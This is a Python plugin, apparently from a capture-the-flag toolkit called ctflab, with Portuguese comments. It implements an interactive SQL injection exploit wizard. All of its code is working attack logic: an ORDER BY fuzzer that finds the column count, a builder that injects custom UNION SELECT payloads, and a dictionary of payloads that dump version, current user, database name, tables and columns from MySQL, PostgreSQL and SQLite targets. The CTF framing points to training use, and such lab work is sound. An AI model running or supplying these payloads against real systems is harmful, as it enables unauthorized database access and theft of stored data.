"""
plugins/sqli.py — plugin: SQL Injection Exploit Wizard.
"""

from __future__ import annotations

import urllib.parse
from rich.console import Console
from ctflab.core import http as H
from ctflab.core.session import Session
from ctflab.cli.ui import ask, askctx

PLUGIN_NAME = "SQLi Exploit Wizard"
PLUGIN_DESC = "Auxilia na exploração interativa de SQL Injection (Union & Error-Based)"

# Dicionário de payloads úteis para extração de metadados
_SQLI_METADATA_PAYLOADS = {
    "MySQL": {
        "Versão": "@@version",
        "Usuário Atual": "current_user()",
        "Nome do Banco": "database()",
        "Tabelas": "group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()",
        "Colunas (especificar tabela)": "group_concat(column_name) FROM information_schema.columns WHERE table_name='{table}'",
    },
    "PostgreSQL": {
        "Versão": "version()",
        "Usuário Atual": "current_user",
        "Nome do Banco": "current_database()",
        "Tabelas": "string_agg(tablename, ',') FROM pg_tables WHERE schemaname='public'",
    },
    "SQLite": {
        "Versão": "sqlite_version()",
        "Tabelas": "group_concat(tbl_name) FROM sqlite_master WHERE type='table'",
    }
}

def run(session: Session, console: Console) -> None:
    console.rule("[head]SQL INJECTION EXPLOIT WIZARD[/head]")
    console.print("[dim]Auxilia na injeção interativa de UNION e dump de metadados de bancos.[/dim]\n")

    path = askctx(session, "path", "caminho do endpoint", "/api/search")
    param = askctx(session, "param", "parâmetro vulnerável", "id")
    method = ask("método (get/post)", "get").lower()

    console.print("\n[info]Selecione a Tecnologia do Banco (Dialeto):[/info]")
    console.print("  [1] MySQL / MariaDB")
    console.print("  [2] PostgreSQL")
    console.print("  [3] SQLite")
    db_opt = ask("Opção", "1")
    
    db_map = {"1": "MySQL", "2": "PostgreSQL", "3": "SQLite"}
    db_type = db_map.get(db_opt, "MySQL")

    console.print("\n[info]Selecione a Técnica / Operação de Exploração:[/info]")
    console.print("  [1] Descobrir número de colunas (ORDER BY)")
    console.print("  [2] Executar UNION SELECT customizável")
    console.print("  [3] Extrair metadados do banco (Versão, Usuário, Tabelas)")
    op_opt = ask("Opção", "1")

    if op_opt == "1":
        # Descobrir número de colunas
        try:
            max_cols = int(ask("Tentar até quantas colunas?", "10"))
        except ValueError:
            console.print("[fail]Valor inválido. Usando padrão: 10[/fail]")
            max_cols = 10
        console.print(f"\n[info]Iniciando fuzzer de ORDER BY (1 a {max_cols})...[/info]")
        
        with H.make_client(session) as cl:
            for cols in range(1, max_cols + 1):
                payload = f"' ORDER BY {cols}-- -"
                try:
                    if method == "get":
                        r = cl.get(path, params={param: payload})
                    else:
                        r = cl.post(path, json={param: payload})
                    
                    # Se der erro 500 ou mensagem de coluna inválida na resposta
                    if r.status_code == 500 or "order by" in r.text.lower() or "unknown column" in r.text.lower():
                        console.print(f"[fail]Erro na coluna {cols}.[/fail] [ok]Número de colunas provável: {cols - 1}[/ok]")
                        session.note(f"SQLi: Colunas estimadas via ORDER BY: {cols - 1}")
                        return
                    else:
                        console.print(f"  Colunas {cols}: OK (HTTP {r.status_code})")
                except Exception as exc:
                    console.print(f"  Erro na requisição da coluna {cols}: {exc}")
                    
        console.print("[warn]Fim do scan de colunas. Nenhum erro explícito retornado.[/warn]")

    elif op_opt == "2":
        # UNION SELECT customizado
        try:
            num_cols = int(ask("Quantidade de colunas detectadas?", "3"))
        except ValueError:
            console.print("[fail]Valor inválido. Usando padrão: 3[/fail]")
            num_cols = 3
        try:
            inject_idx = int(ask("Qual índice de coluna é refletido na tela? (1-indexed)", "2"))
        except ValueError:
            console.print("[fail]Valor inválido. Usando padrão: 2[/fail]")
            inject_idx = 2
        custom_sql = ask("SQL Query a injetar (ex: database() ou select group_concat(username) from users)", "database()")
        
        # Reconstrói a lista de colunas preenchida com NULLs ou inteiros
        cols_list = []
        for i in range(1, num_cols + 1):
            if i == inject_idx:
                cols_list.append(custom_sql)
            else:
                cols_list.append("NULL")
                
        payload = f"' UNION SELECT {', '.join(cols_list)}-- -"
        console.print(f"\n[info]Enviando payload UNION:[/info]\n  [yellow]{payload}[/yellow]\n")
        
        try:
            with H.make_client(session) as cl:
                if method == "get":
                    r = cl.get(path, params={param: payload})
                else:
                    r = cl.post(path, json={param: payload})
                
                console.print("="*60)
                console.print("[ok]RESPOSTA DO SERVIDOR (Snippet):[/ok]")
                console.print("="*60)
                console.print(r.text[:600])
                console.print("="*60)
        except Exception as exc:
            console.print(f"[fail]Falha ao enviar exploit: {exc}[/fail]")

    elif op_opt == "3":
        # Extração de Metadados
        try:
            num_cols = int(ask("Quantidade de colunas detectadas?", "3"))
        except ValueError:
            console.print("[fail]Valor inválido. Usando padrão: 3[/fail]")
            num_cols = 3
        try:
            inject_idx = int(ask("Qual índice de coluna é refletido na tela? (1-indexed)", "2"))
        except ValueError:
            console.print("[fail]Valor inválido. Usando padrão: 2[/fail]")
            inject_idx = 2
        
        console.print(f"\n[info]Metadados disponíveis para {db_type}:[/info]")
        opts = _SQLI_METADATA_PAYLOADS[db_type]
        keys = list(opts.keys())
        for idx, key in enumerate(keys):
            console.print(f"  [{idx + 1}] {key}")
            
        try:
            metadata_opt = int(ask("Escolha a informação a extrair", "1")) - 1
        except ValueError:
            console.print("[fail]Valor inválido. Usando padrão: 1[/fail]")
            metadata_opt = 0
        if metadata_opt < 0 or metadata_opt >= len(keys):
            console.print("[fail]Opção inválida[/fail]")
            return
            
        selected_key = keys[metadata_opt]
        query_tpl = opts[selected_key]
        
        # Caso precise especificar o nome da tabela
        if "{table}" in query_tpl:
            table_name = ask("Nome da tabela a fuzzer (ex: users)", "users")
            query_tpl = query_tpl.format(table=table_name)
            
        cols_list = []
        for i in range(1, num_cols + 1):
            if i == inject_idx:
                cols_list.append(query_tpl)
            else:
                cols_list.append("NULL")
                
        payload = f"' UNION SELECT {', '.join(cols_list)}-- -"
        console.print(f"\n[info]Enviando payload para extrair '{selected_key}':[/info]\n  [yellow]{payload}[/yellow]\n")
        
        try:
            with H.make_client(session) as cl:
                if method == "get":
                    r = cl.get(path, params={param: payload})
                else:
                    r = cl.post(path, json={param: payload})
                
                console.print("="*60)
                console.print(f"[ok]RESULTADO EXTRAÇÃO ({selected_key}):[/ok]")
                console.print("="*60)
                console.print(r.text[:600])
                console.print("="*60)
                session.note(f"SQLi: Metadado extraído ({selected_key}) de {path}")
        except Exception as exc:
            console.print(f"[fail]Falha ao enviar payload de extração: {exc}[/fail]")
